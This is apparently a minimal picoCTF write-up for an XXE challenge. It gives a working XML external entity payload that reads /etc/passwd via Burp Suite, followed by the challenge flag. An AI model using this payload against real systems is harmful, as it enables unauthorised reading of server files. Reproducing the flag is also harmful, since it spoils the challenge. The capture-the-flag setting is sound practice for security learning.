XXE use burpsutie then inject this XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data><ID>&example;</ID></data>
```

Flag:
```
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```